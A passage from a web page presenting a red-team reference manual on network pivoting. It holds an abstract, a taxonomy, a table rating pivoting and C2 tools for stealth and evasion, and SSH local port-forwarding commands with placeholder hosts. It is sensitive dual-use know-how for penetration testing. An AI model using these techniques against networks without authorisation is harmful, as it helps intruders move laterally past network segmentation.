<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-cyber/pivoting-guide" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Comprehensive Network Pivoting in Adversarial Operations | gl0bal01 | Notes &amp; Research</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://gl0bal01.com/cyber/pivoting-guide"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Comprehensive Network Pivoting in Adversarial Operations | gl0bal01 | Notes &amp; Research"><meta data-rh="true" name="description" content="An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations"><meta data-rh="true" property="og:description" content="An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations"><meta data-rh="true" name="keywords" content="network pivoting,lateral movement,penetration testing,red teaming,post exploitation,chisel,ligolo-ng,havoc c2,villain,sliver,metasploit pivoting,gl0bal01,global01"><link data-rh="true" rel="icon" href="/icons/favicon.ico"><link data-rh="true" rel="canonical" href="https://gl0bal01.com/cyber/pivoting-guide"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/cyber/pivoting-guide" hreflang="en"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/cyber/pivoting-guide" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Cyber","item":"https://gl0bal01.com/cyber"},{"@type":"ListItem","position":2,"name":"Network Pivoting","item":"https://gl0bal01.com/cyber/pivoting-guide"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="gl0bal01 | Notes &amp; Research RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="gl0bal01 | Notes &amp; Research Atom Feed">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFE7MZ9S3P"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-NFE7MZ9S3P",{anonymize_ip:!0})</script>



<link rel="search" type="application/opensearchdescription+xml" title="gl0bal01 | Notes &amp; Research" href="/opensearch.xml">


<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Host+Grotesk:wght@600;700;800&amp;display=swap"><link rel="stylesheet" href="/assets/css/styles.017f04e3.css">
<script src="/assets/js/runtime~main.8153230b.js" defer="defer"></script>
<script src="/assets/js/main.a4d13fda.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"dark"),document.documentElement.setAttribute("data-theme-choice",t||"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus"><link rel="preload" as="image" href="/icons/android-icon-48x48.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><div class="theme-announcement-bar announcementBar_mb4j" role="banner"><div class="announcementBarPlaceholder_vyr4"></div><div class="content_knG7 announcementBarContent_xLdY">üéâÔ∏è ‚≠êÔ∏è If you like this repo, give it a star and follow me on <a target="_blank" rel="noopener noreferrer" href="https://github.com/gl0bal01/">GitHub</a> ü•≥Ô∏è</div><button type="button" aria-label="Close" class="clean-btn close closeButton_CVFx announcementBarClose_gvF7"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">gl0bal01</b></a><a class="navbar__item navbar__link" href="/ai">Ai</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/cyber">Cyber</a><a class="navbar__item navbar__link" href="/osint">Osint</a><a class="navbar__item navbar__link" href="/reverse-engineering">Reverse</a><a class="navbar__item navbar__link" href="/cheatsheets">Cheatsheets</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Links</a><ul class="dropdown__menu"><li><a class="dropdown__link" href="/blog/ctf-platforms-training">üé≠ Play &amp; Learn</a></li><li><a href="https://github.com/gl0bal01/" target="_blank" class="dropdown__link">Github<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://discord.gg/T5tc9Rq8DV" target="_blank" class="dropdown__link">Discord<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://start.me/u/gl0bal01" target="_blank" class="dropdown__link">Start.me<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://github.com/gl0bal01/bookmarklets" target="_blank" class="dropdown__link">Bookmarklets<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><a class="navbar__item navbar__link blog-button" href="/blog">Blog</a><a class="navbar__item navbar__link" href="/news">News</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG menuWithAnnouncementBar_GW3s"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/ai"><span title="Ai" class="categoryLinkLabel_W154">Ai</span></a><button aria-label="Expand sidebar category &#x27;Ai&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/cyber"><span title="Cyber" class="categoryLinkLabel_W154">Cyber</span></a><button aria-label="Collapse sidebar category &#x27;Cyber&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/cyber/pivoting-guide"><span title="Network Pivoting" class="linkLabel_WmDU">Network Pivoting</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/cyber/password-cracking-guide"><span title="Password Cracking" class="linkLabel_WmDU">Password Cracking</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/osint"><span title="Osint" class="categoryLinkLabel_W154">Osint</span></a><button aria-label="Expand sidebar category &#x27;Osint&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/reverse-engineering"><span title="Reverse Engineering" class="categoryLinkLabel_W154">Reverse Engineering</span></a><button aria-label="Expand sidebar category &#x27;Reverse Engineering&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/cheatsheets"><span title="Cheatsheets" class="categoryLinkLabel_W154">Cheatsheets</span></a><button aria-label="Expand sidebar category &#x27;Cheatsheets&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/cyber"><span>Cyber</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Network Pivoting</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Comprehensive Network Pivoting in Adversarial Operations: An Academic Reference Manual</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="abstract">Abstract<a href="#abstract" class="hash-link" aria-label="Direct link to Abstract" title="Direct link to Abstract" translate="no">‚Äã</a></h2>
<p>This comprehensive academic reference presents an exhaustive analysis of network pivoting methodologies, tools, and techniques employed in modern adversarial operations. We examine seventeen primary pivoting frameworks across multiple platforms, providing detailed implementation examples, operational security considerations, and advanced detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-introduction">1. Introduction<a href="#1-introduction" class="hash-link" aria-label="Direct link to 1. Introduction" title="Direct link to 1. Introduction" translate="no">‚Äã</a></h2>
<p>Network pivoting constitutes the foundational technique for lateral movement within segmented network infrastructures. This methodology enables adversaries to leverage compromised intermediary systems as communication conduits to access otherwise isolated network segments, effectively circumventing perimeter defenses and network isolation policies.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="11-pivoting-taxonomy">1.1 Pivoting Taxonomy<a href="#11-pivoting-taxonomy" class="hash-link" aria-label="Direct link to 1.1 Pivoting Taxonomy" title="Direct link to 1.1 Pivoting Taxonomy" translate="no">‚Äã</a></h3>
<p>Network pivoting methodologies can be systematically categorized into four primary classes:</p>
<ol>
<li><strong>Port Forwarding</strong>: Direct TCP/UDP port redirection through compromised hosts</li>
<li><strong>Protocol Tunneling</strong>: Encapsulation of network traffic within alternative communication protocols</li>
<li><strong>Proxy Chain Establishment</strong>: Sequential routing through multiple intermediary proxy systems</li>
<li><strong>Virtual Network Creation</strong>: Implementation of virtual network interfaces for transparent communication</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="12-common-pivoting-scenarios">1.2 Common Pivoting Scenarios<a href="#12-common-pivoting-scenarios" class="hash-link" aria-label="Direct link to 1.2 Common Pivoting Scenarios" title="Direct link to 1.2 Common Pivoting Scenarios" translate="no">‚Äã</a></h3>
<p>The following diagram illustrates typical network architectures encountered in adversarial operations:</p>
<!-- -->
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="13-evaluation-framework">1.3 Evaluation Framework<a href="#13-evaluation-framework" class="hash-link" aria-label="Direct link to 1.3 Evaluation Framework" title="Direct link to 1.3 Evaluation Framework" translate="no">‚Äã</a></h3>
<p>Each pivoting methodology is evaluated across seven critical dimensions:</p>
<table><thead><tr><th>Framework</th><th>Stealth</th><th>Protocols</th><th>Platform</th><th>Complexity</th><th>Transparency</th><th>Persistence</th><th>Evasion</th></tr></thead><tbody><tr><td>SSH</td><td>Medium</td><td>TCP</td><td>*nix/Win</td><td>Low</td><td>Medium</td><td>High</td><td>Medium</td></tr><tr><td>Chisel</td><td>High</td><td>TCP/UDP</td><td>Cross</td><td>Medium</td><td>Medium</td><td>High</td><td>High</td></tr><tr><td>Ligolo-ng</td><td>High</td><td>TCP/UDP</td><td>Cross</td><td>Medium</td><td>High</td><td>Medium</td><td>High</td></tr><tr><td>Metasploit</td><td>Low</td><td>TCP</td><td>Cross</td><td>Low</td><td>Low</td><td>Medium</td><td>Low</td></tr><tr><td>Havoc C2</td><td>High</td><td>TCP/HTTP(S)</td><td>Cross</td><td>Medium</td><td>High</td><td>High</td><td>High</td></tr><tr><td>Villain</td><td>High</td><td>TCP/HTTP(S)</td><td>Cross</td><td>Low</td><td>Medium</td><td>High</td><td>High</td></tr><tr><td>Sliver</td><td>High</td><td>Multi</td><td>Cross</td><td>Medium</td><td>High</td><td>High</td><td>Very High</td></tr><tr><td>Socat</td><td>Medium</td><td>TCP/UDP</td><td>*nix</td><td>High</td><td>Low</td><td>Low</td><td>Medium</td></tr><tr><td>Netsh</td><td>Medium</td><td>TCP</td><td>Windows</td><td>Medium</td><td>Medium</td><td>High</td><td>Medium</td></tr><tr><td>Plink</td><td>Medium</td><td>TCP</td><td>Windows</td><td>Low</td><td>Medium</td><td>High</td><td>Medium</td></tr><tr><td>rpivot</td><td>High</td><td>HTTP(S)</td><td>Cross</td><td>Medium</td><td>Medium</td><td>Medium</td><td>High</td></tr><tr><td>reGeorg</td><td>High</td><td>HTTP(S)</td><td>Web</td><td>High</td><td>Low</td><td>Low</td><td>High</td></tr><tr><td>Stunnel</td><td>High</td><td>TCP/TLS</td><td>Cross</td><td>Medium</td><td>Medium</td><td>High</td><td>High</td></tr><tr><td>dnscat2</td><td>Very High</td><td>DNS</td><td>Cross</td><td>High</td><td>Low</td><td>Medium</td><td>Very High</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>Note</div><div class="admonitionContent_BuS1"><p>Evaluation criteria are based on operational field experience, security research publications, and comparative analysis of tool capabilities in controlled environments. Ratings represent relative assessments under typical deployment scenarios and may vary based on specific implementation, configuration, and defensive posture of target networks.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="14-tool-selection-decision-framework">1.4 Tool Selection Decision Framework<a href="#14-tool-selection-decision-framework" class="hash-link" aria-label="Direct link to 1.4 Tool Selection Decision Framework" title="Direct link to 1.4 Tool Selection Decision Framework" translate="no">‚Äã</a></h3>
<p>The following flowchart provides a systematic approach for selecting appropriate pivoting tools based on operational constraints:</p>
<!-- -->
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>This decision framework presents a simplified selection process focusing on primary pivoting tools. Modern C2 frameworks like Villain and Sliver offer multi-protocol support and can be used across multiple paths in this flowchart. For example, Sliver supports HTTP/HTTPS, DNS, mTLS, and WireGuard protocols, while Villain excels in collaborative scenarios with HTTP/HTTPS tunneling. The framework prioritizes tool selection based on immediate operational constraints rather than comprehensive capability assessment.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-ssh-based-pivoting-methodologies">2. SSH-Based Pivoting Methodologies<a href="#2-ssh-based-pivoting-methodologies" class="hash-link" aria-label="Direct link to 2. SSH-Based Pivoting Methodologies" title="Direct link to 2. SSH-Based Pivoting Methodologies" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>The following SSH commands assume you have installed OpenSSH on all relevant hosts. Substitute all placeholder values (e.g., user, pivot_host, 192.168.1.100) with those specific to your environment. Ensure you have valid credentials and network connectivity between client and target hosts.</p></div></div>
<p>SSH represents the most ubiquitous and well-documented pivoting mechanism, leveraging the native capabilities of the OpenSSH implementation for network traffic redirection.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="21-local-port-forwarding">2.1 Local Port Forwarding<a href="#21-local-port-forwarding" class="hash-link" aria-label="Direct link to 2.1 Local Port Forwarding" title="Direct link to 2.1 Local Port Forwarding" translate="no">‚Äã</a></h3>
<p>Local port forwarding establishes a listening port on the client machine that forwards connections to a destination through the SSH server:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Basic local port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">bind_address:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">local_port:destination_host:destination_port user@ssh_server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Forward local port 8080 to internal web server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain">:192.168.1.100:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Bind to specific interface (security consideration)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1:8080:192.168.1.100:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Forward multiple ports simultaneously</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain">:192.168.1.100:80 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">3389</span><span class="token plain">:192.168.1.101:3389 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Background execution with compression</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-fN</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-C</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain">:192.168.1.100:80 user@pivot_host</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="22-remote-port-forwarding">2.2 Remote Port Forwarding<a href="#22-remote-port-forwarding" class="hash-link" aria-label="Direct link to 2.2 Remote Port Forwarding" title="Direct link to 2.2 Remote Port Forwarding" translate="no">‚Äã</a></h3>
<p>Remote port forwarding creates a listening port on the SSH server that forwards connections back to the client:</p>
